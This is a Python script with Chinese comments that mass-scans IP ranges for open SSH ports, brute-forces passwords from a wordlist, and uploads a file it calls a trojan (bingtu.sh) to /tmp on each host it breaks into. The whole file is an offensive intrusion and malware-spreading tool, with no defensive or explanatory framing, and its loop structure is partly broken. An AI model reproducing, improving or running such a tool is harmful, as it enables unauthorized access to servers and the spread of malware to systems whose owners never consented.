#!/usr/bin/env python
# coding=utf-8

from IPy import IP
import socket,os,re,multiprocessing,paramiko
import threading,time
import os.path
from paramiko import SSHClient
from paramiko import AutoAddPolicy
from time import ctime
#---------->定义变量<---------#
#-- 密码文件
password_file=os.path.join(os.getcwd(),"passwd.txt_bak")
#-- ip文件
ip_file=os.path.join(os.getcwd(),"ip.txt")
#-- 执行文件目录
Trojans_file_dir=os.getcwd()+"/include_files"

remote_dir="/tmp"
username="ops"
timeout_time=1
port=22
threads_num=200

#读取ip列表然后将每行ip循环出来,最终存入alllines数组
def loop_ip_everyline():
   with open(ip_file,'r') as f:
      alllines=f.readlines()
      return alllines
#最终输出ip格式的ip地址,最终保存在real_ips数组
def process_ip(line):
   real_ips=[]
   ip= IP(line,make_net=True)
   ips=IP(ip)
   for real_ip in ips:
      rule="(\d+\.){3}(0|255)$"
      x=re.compile(rule)
      if x.search(str(real_ip)) is None:
         real_ips.append(real_ip)
   return real_ips

# 扫描指定ip的指定端口,输出所有开放了22端口的主机,终保存在last_open_ip_list数组
last_open_ip_list=[]
def scan(ip_addr):
   s = socket.socket()
   s.settimeout(timeout_time)
   if s.connect_ex((ip_addr, port)) == 0:
      return ip_addr
   s.close()

def put_Trojans(ip_addr,password):
   try:
      t = paramiko.Transport((ip_addr,int(port)))
      t.connect(username="root",password=password)
      sftp=paramiko.SFTPClient.from_transport(t)
      sftp.put(Trojans_file_dir+"/bingtu.sh",remote_dir+"/bingtu.sh")
      t.close()
   except Exception as e:
      print(2)
      print('upload files failed:'+ip_addr)

def try_password (ip_addr,password):
   try:
      ssh = SSHClient()
      ssh.load_system_host_keys()
      ssh.set_missing_host_key_policy(AutoAddPolicy())
      #print  "当前处理的ip是",ip_addr,"密码是"+password,ctime()
      ssh.connect(ip_addr,port,username,password,pkey=None,timeout = 2,allow_agent=False,look_for_keys=False,banner_timeout=5)
      print("目标ip"+ip_addr+"password",ctime())
      sftpclient = ssh.open_sftp()
      sftpclient.put(Trojans_file_dir+"/bingtu.sh",remote_dir+"/bingtu.sh")
      ssh.close()
      sftpclient.close()
   except Exception as e:
      print(e)
#print "%s processing %s %s" % (name, ip_addr,password),ctime(),"\n"
#print "匹配中\n"
   pass

if __name__ == "__main__":
   #将ip列表中的所有地址范围以ip格式存入数组last_ip_list
   print("将ip列表中的所有地址范围以ip格式存入数组last_ip_list.........")
   print("破解开始"+ctime())
   alllines=loop_ip_everyline()
   ip_addr_list=[]
   for line in alllines:
      real_ips=process_ip(line)
      for x in real_ips:
         ip_addr_list.append(str(x))

   #循环扫描各个ip的22端口,将最终开放了22端口的ip地址以数组的形式存入last_ip_list
   pool = multiprocessing.Pool(processes=threads_num)
   result=[]
   print("扫描端口开始"+ctime())
   for ip_addr in ip_addr_list:
   #print "扫描%s端口中..................." % ip_addr
      result.append(pool.apply_async(scan, args=(ip_addr,)))
      pool.close()
      pool.join()
      last_ip_list=[]
      for x in result:
         if x.get() is not None:
            last_ip_list.append(x.get())
            print("匹配的ip是",last_ip_list)
            print("匹配的ip是",last_ip_list)
            print("端口扫描完成"+ctime())
   #循环匹配开放了22端口主机的密码
   password_list = [i.strip() for i in open(password_file,'r')]
   threads = []
   # 创建新线程
   #n=0
   print("破解密码,传马开始"+ctime())
   #for ip_addr in last_ip_list:
   #    for password in password_list:
   #        #n=n+1
   #        thread = threading.Thread(target=try_password,args=(ip_addr,password))
   #        thread.setDaemon(True)
   #        thread.start()
   #        threads.append(thread)
   #        #print threading.activeCount()
   paramiko.util.log_to_file('paramiko.log')
   pool_1 = multiprocessing.Pool(processes=300)
   for ip_addr in last_ip_list:
      for password in password_list:
         #n=n+1
         pool_1.apply_async(try_password, args=(ip_addr,password,))
         pool_1.close()
         pool_1.join()
   ## 等待所有线程完成
   #for t in threads:
   #    t.join()
   print("结束"+ctime())